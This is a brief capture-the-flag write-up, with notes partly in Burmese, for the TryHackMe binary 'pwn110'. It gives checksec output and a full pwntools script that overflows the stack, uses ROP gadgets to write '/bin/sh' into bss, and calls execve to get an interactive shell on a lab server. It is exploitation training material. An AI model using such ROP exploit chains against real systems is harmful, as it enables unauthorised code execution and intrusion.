

#### pwn110

```c
pwndbg> checksec
File:     /home/Jackfruit/cate/learn/binary/stack/tryhackme/pwn110/pwn110-1644300525386.pwn110
Arch:     amd64
RELRO:      Partial RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
pwndbg> 

```

statically linked , NO PIE ဆိုတော့ ဟားဟားဟား
buffer overflow လို့ရ
system call table နဲ့ read ခေါ်ပြီး`  b"/bin/sh\x00"` ကို `bss` ထဲထည့်
နောက်ပြီး `execv` လုပ်ခိုင်းပြီး `bss` ထဲက` b"/bin/sh\x00" ` ကိုrun ခိုင်း

```python 

from pwn import *

context.log_level = 'info'
context.binary = "./pwn110-1644300525386.pwn110"
elf = context.binary
rop = ROP(elf)

def start():
    if args.R:
        return remote("10.49.173.178", 9009)
    elif args.G:
        return gdb.debug(elf.path, gdbscript='''
            break main
        ''')
    else:
        return process(elf.path)

def exploit1(p):
    payload = b'\x90'*40
    payload += p64(rop.find_gadget(['pop rdi', 'ret']).address)
    payload += p64(0)
    payload += p64(rop.find_gadget(['pop rsi', 'ret']).address)
    payload += p64(elf.bss()+8)
    payload += p64(rop.find_gadget(['pop rdx', 'ret']).address)
    payload += p64(9)
    payload += p64(elf.symbols['read'])
    payload += p64(elf.symbols['main'])
    
    p.recvuntil(b"without libc")
    p.recvline()
    p.sendline(payload)
    # Wait for the read to complete
    p.recvuntil(b"without libc")
    p.recvline()
    p.sendline(b"/bin/sh\x00")
    return

def exploit2(p):
    payload = b'\x90'*40
    # Set rax = 59 (execve syscall)
    payload += p64(rop.find_gadget(['pop rax', 'ret']).address)
    payload += p64(0x3b)
    # Set rdi = address of "/bin/sh"
    payload += p64(rop.find_gadget(['pop rdi', 'ret']).address)
    payload += p64(elf.bss()+8)
    # Set rsi = 0
    payload += p64(rop.find_gadget(['pop rsi', 'ret']).address)
    payload += p64(0)
    # Set rdx = 0
    payload += p64(rop.find_gadget(['pop rdx', 'ret']).address)
    payload += p64(0)
    # Trigger syscall
    payload += p64(rop.find_gadget(['syscall', 'ret']).address)
    
    p.recvuntil(b"without libc")
    p.recvline()
    p.sendline(payload)
    p.interactive()

if __name__ == '__main__':
    io = start()
    exploit1(io)
    exploit2(io)
```
